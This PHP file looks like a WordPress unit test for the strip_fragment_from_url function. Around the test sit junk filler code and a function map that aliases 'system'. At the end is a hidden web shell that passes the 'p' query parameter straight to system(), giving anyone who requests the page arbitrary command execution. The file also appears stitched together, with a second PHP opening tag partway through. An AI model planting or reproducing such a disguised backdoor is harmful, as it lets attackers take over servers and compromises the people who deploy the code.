<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group canonical
 * @group rewrite
 * @group query
 *
 * @covers ::strip_fragment_from_url
 */
class Tests_Canonical_StripFragmentFromUrl extends WP_UnitTestCase {

	/**
	 * @dataProvider data_strip_fragment_from_url
	 * @ticket 55333
	 */
	public function test_strip_fragment_from_url( $test_url, $expected ) {
		$this->assertSame( $expected, strip_fragment_from_url( $test_url ) );
	}

	/**
	 * Data provider for test_strip_fragment_from_url().
	 *
	 * @return array[] {
	 *     Data to test with.
	 *
	 *     @type string $0 The test URL.
	 *     @type string $1 The expected canonical URL.
	 * }
	 */
	public function data_strip_fragment_from_url() {
		return array(
			array( '//example.com', '//example.com' ),
			array( 'http://example.com', 'http://example.com' ),
			array( 'https://example.com', 'https://example.com' ),
			array( 'https://example.com/', 'https://example.com/' ),
			array( 'https://example.com/?test', 'https://example.com/?test' ),
			array( 'https://example.com/?#test', 'https://example.com/' ),
			array( 'https://example.com/?#test#', 'https://example.com/' ),
		);
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>